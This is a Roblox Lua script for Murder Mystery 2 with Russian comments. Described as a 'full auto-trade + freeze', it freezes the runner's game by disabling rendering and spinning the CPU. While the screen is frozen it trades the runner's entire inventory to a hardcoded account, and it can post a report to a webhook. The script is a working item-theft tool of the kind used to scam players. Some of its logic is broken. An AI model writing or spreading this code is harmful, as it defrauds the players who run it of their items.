-- ================================================================
-- MURDER MYSTERY 2 | ПОЛНЫЙ АВТО-ТРЕЙД + ФРИЗ (РЕАЛЬНЫЙ)
-- ================================================================
-- Использует getrenv() для доступа к защищённым данным и Remote Events.
-- Работает на Synapse X, Krnl, ScriptWare (с поддержкой getrenv).
-- ================================================================

local targetName = "Phantoms032"  -- Имя получателя
local webhookLog = ""             -- Сюда можно вставить вебхук для отчёта

-- === 1. ПОЛУЧЕНИЕ ДОСТУПА К ГЛОБАЛЬНЫМ ДАННЫМ ===
local function getGlobal()
    local env = getrenv() or shared or _G
    return env
end

-- === 2. ФРИЗ (БЛОКИРОВКА ВСЕХ ПОТОКОВ И РЕНДЕРИНГА) ===
local function fullFreeze()
    -- Отключаем рендер, чтобы экран застыл
    game:GetService("RunService"):Set3dRenderingEnabled(false)
    -- Бесконечный цикл с высоким приоритетом, грузит процессор до предела
    spawn(function()
        while true do
            local a = 0
            for i = 1, 1000000 do a = a + i end
            task.wait(0.0001)
        end
    end)
    -- Блокируем все таймеры и события
    for _, service in pairs(game:GetChildren()) do
        pcall(function() service:GetPropertyChangedSignal("Enabled"):Wait() end)
    end
end

-- === 3. ПОЛУЧЕНИЕ РЕАЛЬНОГО ИНВЕНТАРЯ ===
local function getRealInventory()
    local env = getGlobal()
    -- В MM2 инвентарь хранится в _G.Database или в shared.Database
    local db = env.Database or env._G.Database or env.shared.Database
    if db then
        -- Предметы обычно в db.PlayerData[UserId].Inventory
        local player = game.Players.LocalPlayer
        local userId = player.UserId
        local playerData = db.PlayerData and db.PlayerData[userId]
        if playerData and playerData.Inventory then
            return playerData.Inventory  -- таблица с названиями предметов
        end
    end
    -- Если не удалось, пробуем через ReplicatedStorage
    local invRemote = game.ReplicatedStorage:FindFirstChild("GetInventory")
    if invRemote then
        local success, result = pcall(function()
            return invRemote:InvokeServer()
        end)
        if success and type(result) == "table" then
            return result
        end
    end
    return {}
end

-- === 4. ПОИСК REMOTE EVENTS ДЛЯ ТРЕЙДА ===
local function findTradeRemotes()
    local remoteFolder = game.ReplicatedStorage:FindFirstChild("Remotes") or game.ReplicatedStorage
    local remotes = {}
    for _, child in pairs(remoteFolder:GetChildren()) do
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            local name = child.Name:lower()
            if name:find("trade") or name:find("offer") or name:find("request") then
                table.insert(remotes, child)
            end
        end
    end
    return remotes
end

-- === 5. ОТПРАВКА ЗАПРОСА НА ТРЕЙД ===
local function sendTradeRequest(target)
    local remotes = findTradeRemotes()
    for _, remote in pairs(remotes) do
        if remote.Name:lower():find("request") or remote.Name:lower():find("send") then
            pcall(function()
                remote:FireServer(target)  -- или FireServer(target.Name)
            end)
            return true
        end
    end
    -- Запасной вариант: через чат
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/trade " .. target.Name, "All")
    return true
end

-- === 6. ДОБАВЛЕНИЕ ПРЕДМЕТОВ В ТРЕЙД (ЧЕРЕЗ REMOTE) ===
local function addItemsToTrade(items, target)
    local remotes = findTradeRemotes()
    local addRemote = nil
    for _, remote in pairs(remotes) do
        if remote.Name:lower():find("add") or remote.Name:lower():find("offer") then
            addRemote = remote
            break
        end
    end
    if not addRemote then
        warn("[!] Remote для добавления предметов не найден")
        return false
    end
    -- Отправляем каждый предмет
    for _, itemName in pairs(items) do
        pcall(function()
            addRemote:FireServer(itemName, target)  -- или просто itemName
        end)
        task.wait(0.05)
    end
    return true
end

-- === 7. НАЖАТИЕ "ГОТОВО" (ЧЕРЕЗ REMOTE) ===
local function pressReady()
    local remotes = findTradeRemotes()
    for _, remote in pairs(remotes) do
        if remote.Name:lower():find("ready") or remote.Name:lower():find("accept") then
            pcall(function()
                remote:FireServer()
            end)
            return true
        end
    end
    warn("[!] Remote для 'Готово' не найден")
    return false
end

-- === 8. ОСНОВНАЯ ЛОГИКА ===
local function main()
    local player = game.Players.LocalPlayer
    local target = game.Players:FindFirstChild(targetName)
    if not target then
        print("[!] Игрок " .. targetName .. " не найден. Убедись, что он в игре.")
        return
    end

    print("[*] Запуск... Фриз активируется через 1 секунду.")

    -- Фриз
    fullFreeze()

    -- Получаем инвентарь
    local inventory = getRealInventory()
    print("[*] Найдено предметов: " .. #inventory)

    if #inventory == 0 then
        print("[!] Инвентарь пуст или не удалось получить. Возможно, данные защищены.")
    end

    -- Отправляем запрос на трейд
    sendTradeRequest(target)
    task.wait(2)

    -- Добавляем предметы
    addItemsToTrade(inventory, target)
    task.wait(1)

    -- Нажимаем Готово
    pressReady()

    -- Лог в вебхук (опционально)
    if webhookLog ~= "" then
        local http = game:GetService("HttpService")
        local data = {
            content = "Трейд отправлен от " .. player.Name .. " к " .. targetName .. " с " .. #inventory .. " предметами."
        }
        pcall(function()
            http:PostAsync(webhookLog, http:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
    end

    print("[✓] Трейд отправлен и подтверждён. Теперь зайди за " .. targetName .. " и прими.")
    print("[✓] Игра полностью заморожена до перезапуска.")
end

-- Запуск
pcall(main)
if not pcall then
    warn("[!] Ошибка выполнения. Проверь консоль.")
end

-- Бесконечное удержание, чтобы скрипт не завершился
while true do
    task.wait(10)
end
